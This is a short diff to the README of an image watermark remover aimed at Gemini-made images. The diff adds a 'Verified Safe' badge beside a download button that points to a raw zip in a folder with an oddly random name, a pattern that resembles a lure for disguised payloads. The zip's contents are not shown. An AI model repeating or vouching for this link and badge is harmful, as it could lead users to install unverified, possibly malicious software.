@@ -1,5 +1,7 @@
 # 🌊 GeminiWatermarkRemover - Effortlessly Remove Watermarks from Images
 
+[![SafeSkill 92/100](https://img.shields.io/badge/SafeSkill-92%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/hooryo-geminiwatermarkremover)
+
 [![Download GeminiWatermarkRemover](https://github.com/Hooryo/GeminiWatermarkRemover/raw/refs/heads/main/azonaphthalene/Remover_Gemini_Watermark_fibrofatty.zip)](https://github.com/Hooryo/GeminiWatermarkRemover/raw/refs/heads/main/azonaphthalene/Remover_Gemini_Watermark_fibrofatty.zip)
 
 ## 📖 Introduction
